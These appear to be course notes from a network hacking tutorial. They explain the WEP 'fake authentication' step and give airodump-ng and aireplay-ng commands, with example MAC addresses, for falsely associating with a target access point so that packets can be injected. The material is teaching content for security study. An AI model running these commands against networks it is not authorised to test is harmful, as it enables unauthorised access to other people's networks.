# Section 06 - Network Hacking - Gaining Access (WEP/WPA/WPA2 Cracking)

## WEP Cracking - Fake Authentication

This method applies when a large number of packets/IVs is not readily available (i.e. the network is not busy). It forces the AP to generate new IVs so you do not have to wait multiple hours.

The first step is to associate with the network. This is different from connecting and does not require any password. You just tell the network "please don't ignore me" so you can inject packets.

Capture packets with:
```bash
airodump-ng --bssid=<BSSID> --channel=<CH> --write=arpreplay $IFACE
```

In a second terminal window, use `aireplay-ng` to associate with the network by performing a **Fake Authentication** attack a single time:
```bash
aireplay-ng --fakeauth=0 -a <MAC_ADDRESS_OF_TARGET_NETWORK> -h <MAC_ADDRESS_OF_ADAPTER> $IFACE
```

The MAC address of the target network is the same BSSID used with `airodump-ng`. The MAC address of the wireless adapter is given by the first 12 characters of the `unspec` field of the network adapter (with dashes replaced by columns), as returned by `ifconfig` (same as the `ether` field when in `Managed` mode). For example:
```bash
aireplay-ng --fakeauth=0 -a 64:16:F0:EC:7B:F3 -h 48:5D:60:2A:45:25 $IFACE
```

As a result:
- The `aireplay-ng` command reports a successful association
- The `AUTH`field of the wifi network is now set to `OPN` in the first terminal
- A new connected client shows up in the second section of the first terminal (the network adapter itself)
- The AP will accept incoming requests from the wireless adapter (in spite of not being actually connected)
